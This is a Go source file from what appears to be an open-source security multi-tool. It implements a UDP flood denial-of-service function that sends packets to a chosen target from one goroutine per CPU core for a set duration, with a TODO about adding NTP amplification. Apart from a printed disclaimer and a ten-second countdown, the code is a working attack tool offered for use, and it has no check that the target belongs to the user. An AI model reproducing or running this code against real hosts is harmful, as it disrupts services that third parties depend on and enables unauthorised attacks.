package tasks

/*
   Copyright 2018 TheRedSpy15

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.
*/

import (
	"fmt"
	"io"
	"net"
	"time"

	"github.com/TheRedSpy15/Multi-Go/utils"
	"github.com/daviddengcn/go-colortext"
	"github.com/shirou/gopsutil/cpu"
)

var defaultTime = time.Minute

// Dos indefinitely sends data to target
// TODO: add amplification - such as NTP monlist
func Dos(target string, duration *time.Duration) {
	if duration == nil {
		duration = &defaultTime
	}
	utils.CheckTarget(target) // make sure target is valid

	addr, err := net.ResolveUDPAddr("udp", target)
	utils.CheckErr(err)
	conn, err := net.DialUDP("udp", nil, addr) // setup connection object
	defer conn.Close()                         // make sure to close connection when finished

	utils.CheckErr(err)

	ct.Foreground(ct.Green, true) // ets text color to bright red
	fmt.Println("Checks passed!")

	ct.Foreground(ct.Red, true)                                            // set text color to bright red
	fmt.Println("\nWarning: you are solely responsible for your actions!") // disclaimer
	fmt.Println("ctrl + c to cancel")
	fmt.Println("\n10 seconds until DOS")
	ct.ResetColor() // reset text color to default

	time.Sleep(10 * time.Second) // 10 second delay - give chance to cancel

	threads, err := cpu.Counts(false)
	utils.CheckErr(err)

	done := make(chan struct{})
	for i := 0; i < threads; i++ { // create a goroutine per thread for spamming
		go spam(conn, done)            // start concurrent spamming
		ct.Foreground(ct.Yellow, true) // set text color to dark yellow
	}
	<-time.After(*duration)
	for i := 0; i < threads; i++ {
		done <- struct{}{}
	}
}

// spam - constantly writes data to a target until stopped
func spam(w io.Writer, done <-chan struct{}) {
	fmt.Println("Starting loop")
	for {
		select {
		case <-done:
			fmt.Println("Exiting loop")
			return
		default:
			_, err := fmt.Fprintf(w, "Sup UDP Server, how you doing?")
			utils.CheckErr(err)

			fmt.Println("looped")
		}
	}
}
